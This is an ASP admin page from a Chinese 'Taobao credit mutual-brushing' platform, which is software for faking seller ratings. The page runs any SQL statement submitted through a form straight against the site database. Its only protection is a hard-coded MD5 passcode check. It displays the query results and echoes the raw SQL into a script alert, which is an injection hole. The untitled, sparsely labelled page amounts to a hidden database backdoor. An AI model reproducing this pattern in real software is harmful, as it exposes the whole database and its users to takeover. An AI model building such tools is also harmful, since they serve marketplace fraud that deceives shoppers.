<!--#include file="../inc/index_conn.asp"-->
<!--#include file="../md5.asp"-->
<%
'------------------------------------------------------------------
'***************************淘宝信誉互刷系统***********************
'本程序专为淘宝免费互刷打造，是目前市面上功能比较齐全的平台
'程序开发：七  七 传 媒
'官方主页：http://www.778892.com
'技术支持：xsh
'QQ;859680966
'电话：15889679112
'版权：版权属于七七传媒信息技术有限公司，不得拷贝、修改，侵权必究。
'Copyright (C) 2013 七七传媒信息技术有限公司 版权所有
'*****************************************************************
'------------------------------------------------------------------
Sub alert(text)
	Response.Write("<script language=""javascript"">")
	Response.Write("alert("""& text &""");")
	'Response.Write("history.back();")
	Response.Write("</script>")
End Sub 
If Trim(Request.Form("action"))="exe" Then
if md5(request.Form("czm"))<>"0c6ed029ed3b462d" then
response.End()
end if
	on error resume next
	sql = Trim(Request.Form("sqlstrbox"))
	set rs = conn.execute(sql)
	if Err.number<>0 then
		Call alert("L失败！\n错误描述：\n"& err.Description )
	else
		Call alert("L成功！\nS 语句：\n"& sql )
	end if 
	if InStr(LCase(sql),"select")=1 then isselect = true
end if
%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title></title>
<LINK href="css.css" type="text/css" rel="stylesheet">
<script language="JavaScript" type="text/javascript">
<!--
function sqlbox(a){
	var obj=document.all.sqlstrbox;
	if(a == 1){
		obj.rows += 2;
	}else{
		if(obj.rows == 5){return false;};
		obj.rows -= 2;
	}
}
function sql_empty(){
	var sql_str='';
	var obj = document.all.sqlstrbox;
	obj.value = sql_str;
}
function sql_insert(){
	var sql_str='INSERT INTO table () VALUES ()';
	var obj = document.all.sqlstrbox;
	obj.value = sql_str;
}
function sql_update(){
	var sql_str = 'UPDATE table SET = WHERE =';
	var obj = document.all.sqlstrbox;
	obj.value = sql_str;
}
function sql_delete(){
	var sql_str = 'DELETE FROM table WHERE =';
	var obj = document.all.sqlstrbox;
	obj.value = sql_str;
}
function sql_action(action){
	eval('sql_' + action + '()');
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
//-->
</script>
</head>

<body onLoad="MM_preloadImages('images/botton_submitb.gif','images/botton_resetb.gif')">
<table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="52">&nbsp;</td>
        <td background="images/main_2.jpg" class="title1">&nbsp;</td>
        <td width="52">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">      
	  <tr>
        <td width="15" background="images/main_4.gif">&nbsp;</td>
        <td background="images/main_9.gif">
		<table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
            <form id="form1" name="form1" method="post" action=""><tr>
              <td align="center"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="1" class="table">
                
                  <tr align="center" class="td2">
                    <td colspan="2">&nbsp;</td>
                  </tr>
                  <tr class="td">
                    <td width="60" align="center">模版</td>
                    <td><input name="radiobutton" type="radio" value="radiobutton" checked="checked" onClick="javascript:sql_action('empty');" />
                      <label>
                      <input type="text" name="czm">
                      </label></td>
                  </tr>
                  <tr class="td">
                    <td width="60">&nbsp;</td>
                    <td>&nbsp;</td>
                  </tr>
                  <tr class="td">
                    <td width="60" align="center">&nbsp;</td>
                    <td><table border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td><textarea name="sqlstrbox" cols="80" rows="5" id="sqlstrbox"></textarea>
						  <input name="<%=jieducm%>" type="hidden" value="<%=jieducm%>">
						  </td>
                          <td width="30" align="center" valign="baseline"><a href="javascript:sqlbox(1);" onClick="this.blur();"><img src="images/sizeplus.gif" alt="增高编辑区" width="20" height="20" border="0"></a><br>
                            <a href="javascript:sqlbox(0);" onClick="this.blur();"><img src="images/sizeminus.gif" alt="减小编辑区" width="20" height="20" border="0"></a></td>
                        </tr>
                    </table></td>
                  </tr>
              </table></td>
            </tr>
            <tr>
              <td height="34" align="center" valign="bottom"><a href="javascript:document.form1.submit()" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image5','','images/botton_submitb.gif',1)">
                <input name="action" type="hidden" id="action" value="exe" />
                <img src="images/botton_submit.gif" name="Image5" width="73" height="21" border="0"> </a>&nbsp;<a href="javascript:document.form1.reset()" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image6','','images/botton_resetb.gif',1)"><img src="images/botton_reset.gif" name="Image6" width="73" height="21" border="0"></a></td>
            </tr></form>
          </table>
          <% If isselect Then %>
<table width="98%" border="0" align="center" cellpadding="0" cellspacing="1" class="table">
  <tr align="center" class="td2">
<% For Each Item in rs.Fields %>
    <td><%= Item.Name %></td>
<% Next %>  
  </tr>
  <tr align="center" class="td2">
<% For Each Item in rs.Fields %>
    <td><%= Item.type %>|<%= Item.definedsize %></td>
<% Next %>  
  </tr>
<% While Not rs.Eof %>
  <tr align="center" class="td">
<% For Each Item in rs.Fields %>
    <td><%= Item.Value %></td>
<% Next %>  
  </tr>
<% rs.Movenext
wend %>  
</table>
<% End If %></td>
        <td width="15" background="images/main_5.gif">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="52">&nbsp;</td>
        <td background="images/main_7.gif">&nbsp;</td>
        <td width="52">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>